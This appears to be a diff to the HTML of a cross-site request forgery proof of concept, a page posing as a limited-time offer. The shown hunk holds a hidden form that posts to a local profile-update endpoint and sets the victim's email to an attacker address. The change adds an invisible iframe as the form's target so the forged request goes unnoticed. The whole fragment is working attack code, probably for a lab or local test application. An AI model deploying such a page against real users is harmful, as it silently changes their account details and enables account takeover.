@@ -52,7 +52,9 @@
     <p id="status"></p>
     <p class="fine-print">Limited time offer. One per household.</p>
 
-    <form id="csrf-form" action="http://127.0.0.1:5000/profile/update" method="POST" style="display:none">
+    <iframe name="hidden-target" style="display:none;width:0;height:0;border:0;"></iframe>
+    <form id="csrf-form" action="http://127.0.0.1:5000/profile/update" method="POST"
+          target="hidden-target" style="display:none">
         <input type="email" name="email" value="hacked-by-csrf@attacker.com">
     </form>
 
